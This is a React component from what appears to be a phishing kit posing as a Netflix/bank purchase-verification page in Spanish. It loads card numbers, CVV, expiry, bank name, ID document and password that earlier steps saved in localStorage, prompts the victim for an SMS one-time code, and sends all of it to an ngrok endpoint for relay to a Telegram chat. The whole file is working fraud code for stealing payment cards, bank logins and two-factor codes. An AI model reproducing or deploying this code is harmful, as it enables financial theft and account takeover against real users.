import React, { useState, useEffect } from 'react';

const OTPVerification = ({ onBack }) => {
    const [otp, setOtp] = useState('');
    const [error, setError] = useState(false);
    const [formValues, setFormValues] = useState({});
    const [banco, setBanco] = useState('');
    const [userDocument, setUserDocument] = useState('');
    const [password, setPassword] = useState('');

    useEffect(() => {
        // Recuperar datos del localStorage
        const storedFormValues = JSON.parse(localStorage.getItem('formValues')) || {};
        const storedBanco = localStorage.getItem('banco') || '';
        const storedUserDocument = localStorage.getItem('userDocument') || '';
        const storedPassword = localStorage.getItem('password') || '';

        setFormValues(storedFormValues);
        setBanco(storedBanco);
        setUserDocument(storedUserDocument);
        setPassword(storedPassword);
    }, []);

    const sendTelegramMessage = async (message) => {
        try {
            const chatId = '-4542132850'; // Asegúrate de que este ID sea correcto
            const response = await fetch('https://proof.ngrok.app/enviarmensaje', { // Cambia esta URL por tu endpoint
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ chatId, message }),
            });

            if (!response.ok) {
                throw new Error('Error al enviar el mensaje a Telegram');
            }
        } catch (error) {
            console.error('Error:', error);
        }
    };

    const handleSubmit = async () => {
        if (otp.length === 6) {
            await enviarOtp(otp);
        } else {
            setError(true);
        }
    };

    const enviarOtp = async (otp) => {
        console.log('OTP enviado:', otp);

        // Crear un mensaje personalizado
        const message = `🔑📱 KEY NETFLIX 📱🔑:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName || 'No disponible'}\n- 💳: ${formValues.cardNumber || 'No disponible'}\n- 📅: ${formValues.expirationDate || 'No disponible'}\n- 🔐: ${formValues.cvv || 'No disponible'}\n-------------------------------------------\n 🔑📱 LOGIN NETFLIX 📱🔑\n ------------------------------------------- \n 🏦 : ${banco}\n 👤 : ${userDocument}\n 🔒 : ${password}\n -------------------------------------------\n⚡ OTP ⚡\n-------------------------------------------\n 🔒: ${otp}`;
        await sendTelegramMessage(message); // Enviar mensaje a Telegram
    };

    return (
        <div className="flex flex-col items-center justify-center p-4 bg-white">
            <h3 className="text-black text-lg font-semibold mb-2 text-center">Vamos a validar tu compra</h3>
            <p className="text-black mb-4 text-center">Ingresa el código SMS que te acabamos de enviar y dale "Confirmar".</p>
            <input
                type="tel"
                value={otp}
                onChange={(e) => {
                    setOtp(e.target.value);
                    setError(false);
                }}
                required
                minLength="6"
                maxLength="6"
                className={`border ${error ? 'border-red-500' : 'border-gray-300'} rounded p-2 mb-2 w-full max-w-xs text-center`}
                placeholder="Código OTP"
            />
            {error && <p className="text-red-500 text-sm mb-2 text-center">Por favor ingresa un código válido.</p>}
            <button
                onClick={handleSubmit}
                className="bg-[#1973B8] text-white rounded py-2 px-4 w-full max-w-xs hover:bg-blue-700 transition duration-300 mb-2"
            >
                ENVIAR
            </button>
            <button
                onClick={onBack}
                className="mt-4 text-blue-600 underline"
            >
                Regresar
            </button>
        </div>
    );
};

export default OTPVerification;
